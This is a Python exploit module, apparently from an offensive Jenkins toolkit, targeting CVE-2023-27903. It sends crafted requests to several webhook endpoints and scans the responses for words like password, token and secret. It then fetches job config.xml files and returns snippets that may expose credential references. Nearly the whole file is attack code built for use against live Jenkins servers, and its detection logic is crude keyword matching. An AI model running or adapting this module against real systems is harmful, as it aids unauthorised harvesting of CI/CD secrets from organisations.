"""
CVE-2023-27903: Jenkins Credential Exposure via Webhook

This exploit leverages a vulnerability in Jenkins that exposes stored credentials
when processing crafted webhook requests.
"""

import json
from typing import Any

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class CVE_2023_27903(ExploitModule):
    """Jenkins credential exposure via crafted webhook requests."""

    CVE_ID = "CVE-2023-27903"

    METADATA = ExploitMetadata(
        cve_id="CVE-2023-27903",
        name="Jenkins Credential Exposure via Webhook",
        description="Exposure of stored credentials through crafted webhook requests",
        affected_versions=["Jenkins <= 2.393", "LTS <= 2.375.3"],
        mitre_attack=["T1190", "T1552.001", "T1213"],
        severity="high",
        references=[
            "https://www.jenkins.io/security/advisory/2023-03-08/",
            "https://www.cisa.gov/news-events/bulletins/sb23-079",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-27903"
        ],
        requires_auth=False,
        requires_crumb=False,
        tags=["credential-exposure", "webhook", "information-disclosure"]
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if the target Jenkins instance is vulnerable.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if vulnerable, False otherwise
        """
        try:
            response = session.get("/git/notifyCommit")
            return response.status_code in [200, 400, 405]
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Exploit CVE-2023-27903 to expose credentials via webhook.

        This sends crafted webhook requests to trigger credential exposure
        in error responses or debug information.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - repository_url (str): Repository URL to use in webhook (optional)

        Returns:
            ExploitResult: Result of the exploit
        """
        repo_url = kwargs.get('repository_url', 'https://github.com/exploit/test.git')
        exposed_credentials = []

        webhook_endpoints = [
            "/git/notifyCommit",
            "/github-webhook/",
            "/generic-webhook-trigger/invoke",
            "/bitbucket-hook/",
            "/gitlab-hook/",
        ]

        payloads = [
            {"url": repo_url},
            {"repository": {"url": repo_url}},
            {"ref": "refs/heads/master", "repository": {"clone_url": repo_url}},
        ]

        try:
            for endpoint in webhook_endpoints:
                for payload_idx, payload in enumerate(payloads):
                    try:
                        params = {"url": repo_url} if endpoint == "/git/notifyCommit" else {}

                        response = session.post(
                            endpoint,
                            params=params,
                            headers={"Content-Type": "application/json"},
                            data=json.dumps(payload)
                        )

                        response_text = response.text.lower()

                        credential_indicators = [
                            'password', 'token', 'secret', 'credential',
                            'api_key', 'apikey', 'authorization', 'bearer',
                            'username', 'ssh_key', 'private_key'
                        ]

                        found_indicators = [ind for ind in credential_indicators if ind in response_text]

                        if found_indicators and response.status_code in [200, 400, 500]:
                            exposed_credentials.append({
                                "endpoint": endpoint,
                                "payload_type": f"payload_{payload_idx}",
                                "indicators_found": found_indicators,
                                "status_code": response.status_code,
                                "response_snippet": response.text[:500]
                            })

                    except Exception:
                        continue

            if exposed_credentials:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Found {len(exposed_credentials)} webhook responses with credential indicators",
                    data={
                        "exposures": exposed_credentials,
                        "method": "Crafted webhook requests",
                        "note": "Review response snippets for actual credential values"
                    }
                )

            response = session.get("/api/json?tree=jobs[name,url]")
            if response.status_code == 200:
                data = response.json()
                jobs = data.get('jobs', [])

                for job in jobs[:10]:
                    job_name = job.get('name')
                    if not job_name:
                        continue

                    try:
                        job_config_response = session.get(f"/job/{job_name}/config.xml")

                        if job_config_response.status_code == 200:
                            config_text = job_config_response.text.lower()

                            if any(indicator in config_text for indicator in ['credentialsid', 'credentialid', '<credentials>']):
                                exposed_credentials.append({
                                    "source": f"job_config_{job_name}",
                                    "method": "Job configuration inspection",
                                    "config_snippet": job_config_response.text[:500]
                                })
                    except Exception:
                        continue

            if exposed_credentials:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="success",
                    details=f"Found credential references in {len(exposed_credentials)} job configurations",
                    data={
                        "credential_references": exposed_credentials,
                        "method": "Job configuration analysis"
                    }
                )
            else:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="No credential exposure detected via webhook or job configs",
                    error="Target may be patched or no credentials configured"
                )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Exploitation failed: {str(e)}",
                error=str(e)
            )
